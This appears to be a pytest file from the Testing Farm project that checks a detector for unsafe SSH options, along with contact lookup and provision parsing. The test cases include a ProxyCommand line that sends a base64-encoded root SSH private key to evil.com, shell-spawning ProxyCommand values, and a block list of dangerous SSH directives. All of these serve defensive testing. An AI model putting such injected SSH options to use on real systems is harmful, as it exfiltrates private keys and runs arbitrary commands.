# Copyright Contributors to the Testing Farm project.
# SPDX-License-Identifier: Apache-2.0

import pytest

from gluetool_modules_framework.libs.test_schedule_tmt import get_test_contacts, \
    TMTDiscoveredTest, TMTPlanProvision, detect_unsafe_ssh_options, normalize_ssh_directive

CONTACT_ONE = 'John Doe <jdoe@example.com>'
CONTACT_TWO = 'John Smith <jsmith@example.com>'
TEST_WITH_CONTACT_ONE = TMTDiscoveredTest(name='/test/with/contact', contact=[CONTACT_ONE],
                                          serial_number=1)
TEST_WITH_CONTACT_TWO = TMTDiscoveredTest(name='/test/with/contact', contact=[CONTACT_TWO],
                                          serial_number=2)
TEST_WITHOUT_CONTACT = TMTDiscoveredTest(name='/test/without/contact', contact=[],
                                         serial_number=3)
DISCOVERED_TESTS = [TEST_WITH_CONTACT_ONE, TEST_WITH_CONTACT_TWO, TEST_WITHOUT_CONTACT]
UNSAFE_SSH_DIRECTIVES = frozenset([
    normalize_ssh_directive(directive) for directive in [
        'ProxyCommand',
        'ProxyJump',
        'PermitLocalCommand',
        'LocalCommand',
        'LocalForward',
        'RemoteForward',
        'DynamicForward',
        'Match'
    ]
])


@pytest.mark.parametrize('test_name, test_serial_number, expected', [
    ('/non/existent/test', 1, []),
    ('/test/without/contact', 2, []),
    ('/test/with/contact', 2, [CONTACT_TWO]),
    ('/test/with/contact', 1, [CONTACT_ONE]),
])
def test_get_test_contact(test_name, test_serial_number, expected):
    assert get_test_contacts(test_name, test_serial_number, DISCOVERED_TESTS) == expected


@pytest.mark.parametrize('ssh_options, expected', [
    # benign options are allowed
    (None, []),
    ([], []),
    (['ServerAliveInterval=5'], []),
    (['StrictHostKeyChecking no', 'ConnectTimeout=60'], []),
    # the documented exploit variants are refused
    (['ProxyCommand=curl https://evil.com/$(cat /root/.ssh/id_rsa | base64)'], ["plan ssh-option 'ProxyCommand'"]),
    (['PermitLocalCommand=yes', 'LocalCommand=id'],
     ["plan ssh-option 'PermitLocalCommand'", "plan ssh-option 'LocalCommand'"]),
    (['LocalForward 8080 localhost:80'], ["plan ssh-option 'LocalForward'"]),
    (['RemoteForward 2222 127.0.0.1:22'], ["plan ssh-option 'RemoteForward'"]),
    # directive names are case-insensitive and `Directive value` form is handled as well
    (['proxycommand /bin/sh -c id'], ["plan ssh-option 'proxycommand'"]),
    (['ProxyCommand /bin/sh'], ["plan ssh-option 'ProxyCommand'"]),
])
def test_detect_unsafe_ssh_options_plan(ssh_options, expected):
    assert detect_unsafe_ssh_options(ssh_options=ssh_options, directives=UNSAFE_SSH_DIRECTIVES) == expected


@pytest.mark.parametrize('environment, expected', [
    (None, []),
    ({'TMT_SSH_SERVER_ALIVE_INTERVAL': '5', 'FOO': 'bar'}, []),
    ({'TMT_SSH_PROXY_COMMAND': 'curl evil'}, ["environment variable 'TMT_SSH_PROXY_COMMAND'"]),
    # tmt strips underscores and titlecases, so a separator-less variant maps to the same directive
    ({'TMT_SSH_PROXYCOMMAND': 'curl evil'}, ["environment variable 'TMT_SSH_PROXYCOMMAND'"]),
    ({'TMT_SSH_LOCAL_FORWARD': '8080 localhost:80'}, ["environment variable 'TMT_SSH_LOCAL_FORWARD'"]),
])
def test_detect_unsafe_ssh_options_environment(environment, expected):
    assert detect_unsafe_ssh_options(environment=environment, directives=UNSAFE_SSH_DIRECTIVES) == expected


def test_detect_unsafe_ssh_options_without_directives():
    assert detect_unsafe_ssh_options(ssh_options=['ProxyCommand=id']) == []
    assert detect_unsafe_ssh_options(environment={'TMT_SSH_PROXY_COMMAND': 'id'}) == []


def test_detect_unsafe_ssh_options_custom_directives():
    # an empty directive set disables all checks
    assert detect_unsafe_ssh_options(ssh_options=['ProxyCommand=id'], directives=frozenset()) == []

    # only the configured directives are rejected
    directives = frozenset([normalize_ssh_directive('ServerAliveInterval')])
    assert detect_unsafe_ssh_options(ssh_options=['ProxyCommand=id'], directives=directives) == []
    assert detect_unsafe_ssh_options(ssh_options=['ServerAliveInterval=5'], directives=directives) == \
        ["plan ssh-option 'ServerAliveInterval'"]


@pytest.mark.parametrize('ssh_option, expected', [
    (None, None),
    ('ProxyCommand=id', ['ProxyCommand=id']),
    (['ProxyCommand=id'], ['ProxyCommand=id']),
])
def test_provision_ssh_option_normalization(ssh_option, expected):
    data = {'how': 'connect'}
    if ssh_option is not None:
        data['ssh-option'] = ssh_option

    provision = TMTPlanProvision._structure(data)
    assert provision.ssh_option == expected
